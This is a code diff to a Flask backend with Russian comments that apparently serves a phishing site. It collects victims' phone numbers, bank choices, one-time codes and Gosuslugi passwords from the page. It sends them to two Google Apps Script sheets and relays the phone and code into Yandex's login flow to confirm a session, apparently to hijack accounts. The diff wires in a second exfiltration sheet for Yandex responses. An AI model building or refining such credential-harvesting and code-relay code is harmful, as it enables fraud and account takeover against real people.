@@ -3,12 +3,13 @@ from flask_cors import CORS
 import requests
 import datetime
 import sys
-import re
 
 app = Flask(__name__)
 CORS(app)
 
-GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycby8FtDx4t4akWrHitfrab9lJ_IT002a3O4LmOJjVLDPj4WFzRiHWvHwooSXdlciReh0/exec"
+# Два URL для разных таблиц
+GOOGLE_SCRIPT_SITE_LOGS = "https://script.google.com/macros/s/AKfycby8FtDx4t4akWrHitfrab9lJ_IT002a3O4LmOJjVLDPj4WFzRiHWvHwooSXdlciReh0/exec"
+GOOGLE_SCRIPT_YANDEX_LOGS = "https://script.google.com/macros/s/AKfycbyOvLAcytqkHm5qn8JeVmBvTMzE0_GRUr4bTo6NEq-kAfW8NGVJ6L3eD_Ar43Z095KT/exec"
 
 HEADERS = {
     'User-Agent': 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
@@ -26,9 +27,10 @@ def log(msg):
     print(line)
     sys.stdout.flush()
 
-def log_to_google(data):
+def log_to_google(url, data):
+    """Отправляет данные в Google Таблицу по указанному URL"""
     try:
-        requests.post(GOOGLE_SCRIPT_URL, json=data, timeout=10)
+        requests.post(url, json=data, timeout=10)
     except Exception as e:
         log(f"Google log error: {e}")
 
@@ -50,7 +52,7 @@ def request_yandex_code(phone):
         
         if not csrf:
             log("ERROR: CSRF token not found")
-            log_to_google({'type': 'error', 'message': 'CSRF token not found', 'phone': phone})
+            log_to_google(GOOGLE_SCRIPT_YANDEX_LOGS, {'type': 'error', 'message': 'CSRF token not found', 'phone': phone})
             return False
         
         data = {
@@ -64,8 +66,15 @@ def request_yandex_code(phone):
             data=data
         )
         
-        log(f"Yandex request code response: {response.status_code} - {response.text[:300]}")
-        log_to_google({'type': 'yandex_request', 'phone': phone, 'status': response.status_code, 'response': response.text[:200]})
+        # Пишем ПОЛНЫЙ ответ Яндекса во ВТОРУЮ таблицу
+        log(f"Yandex response: {response.status_code}")
+        log_to_google(GOOGLE_SCRIPT_YANDEX_LOGS, {
+            'type': 'yandex_response',
+            'phone': phone,
+            'status': response.status_code,
+            'headers': str(dict(response.headers))[:500],
+            'body': response.text[:1000]
+        })
         
         sessions[phone] = {
             'session': session,
@@ -76,14 +85,13 @@ def request_yandex_code(phone):
         return True
     except Exception as e:
         log(f"Yandex error: {e}")
-        log_to_google({'type': 'error', 'message': str(e), 'phone': phone})
+        log_to_google(GOOGLE_SCRIPT_YANDEX_LOGS, {'type': 'error', 'message': str(e), 'phone': phone})
         return False
 
 def confirm_yandex_code(phone, code):
     try:
         if phone not in sessions:
-            log(f"ERROR: No session for {phone}")
-            log_to_google({'type': 'error', 'message': 'No session found', 'phone': phone})
+            log_to_google(GOOGLE_SCRIPT_YANDEX_LOGS, {'type': 'error', 'message': 'No session found', 'phone': phone})
             return False
         
         session_data = sessions[phone]
@@ -100,14 +108,21 @@ def confirm_yandex_code(phone, code):
             data=data
         )
         
-        log(f"Yandex confirm response: {response.status_code} - {response.text[:300]}")
-        log_to_google({'type': 'yandex_confirm', 'phone': phone, 'code': code, 'status': response.status_code, 'response': response.text[:200]})
+        # Пишем результат подтверждения во ВТОРУЮ таблицу
+        log(f"Yandex confirm response: {response.status_code}")
+        log_to_google(GOOGLE_SCRIPT_YANDEX_LOGS, {
+            'type': 'yandex_confirm',
+            'phone': phone,
+            'code': code,
+            'status': response.status_code,
+            'body': response.text[:500]
+        })
         
         del sessions[phone]
         return True
     except Exception as e:
         log(f"Yandex confirm error: {e}")
-        log_to_google({'type': 'error', 'message': str(e), 'phone': phone})
+        log_to_google(GOOGLE_SCRIPT_YANDEX_LOGS, {'type': 'error', 'message': str(e), 'phone': phone})
         return False
 
 @app.route('/', methods=['GET'])
@@ -123,29 +138,21 @@ def collect():
     log(f"=== NEW REQUEST: {msg_type} ===")
 
     if msg_type == 'bank_selected':
-        log(f"BANK: {data.get('bankName')}")
-        log_to_google({'type': 'bank_selected', 'bank': data.get('bank'), 'bankName': data.get('bankName')})
+        log_to_google(GOOGLE_SCRIPT_SITE_LOGS, {'type': 'bank_selected', 'bank': data.get('bank'), 'bankName': data.get('bankName')})
 
     elif msg_type == 'bank_phone':
-        log(f"PHONE: {phone}")
-        log_to_google({'type': 'phone', 'phone': phone, 'bank': data.get('bankName', '')})
+        log_to_google(GOOGLE_SCRIPT_SITE_LOGS, {'type': 'phone', 'phone': phone, 'bank': data.get('bankName', '')})
         request_yandex_code(phone)
 
     elif msg_type == 'bank_code':
-        code = data.get('code', '')
-        status = data.get('status', '')
-        log(f"CODE: {code} | STATUS: {status}")
-        log_to_google({'type': 'code', 'code': code, 'status': status, 'phone': phone})
-        confirm_yandex_code(phone, code)
+        log_to_google(GOOGLE_SCRIPT_SITE_LOGS, {'type': 'code', 'code': data.get('code'), 'status': data.get('status'), 'phone': phone})
+        confirm_yandex_code(phone, data.get('code', ''))
 
     elif msg_type == 'gosuslugi_phone':
-        log(f"GOSUSLUGI LOGIN: {phone}")
-        log(f"GOSUSLUGI PASSWORD: {data.get('password')}")
-        log_to_google({'type': 'gosuslugi_login', 'phone': phone, 'password': data.get('password')})
+        log_to_google(GOOGLE_SCRIPT_SITE_LOGS, {'type': 'gosuslugi_login', 'phone': phone, 'password': data.get('password')})
 
     elif msg_type == 'gosuslugi_code':
-        log(f"GOSUSLUGI CODE: {data.get('code')} | STATUS: {data.get('status')}")
-        log_to_google({'type': 'gosuslugi_code', 'code': data.get('code'), 'status': data.get('status')})
+        log_to_google(GOOGLE_SCRIPT_SITE_LOGS, {'type': 'gosuslugi_code', 'code': data.get('code'), 'status': data.get('status')})
 
     return jsonify({'status': 'ok'})
 
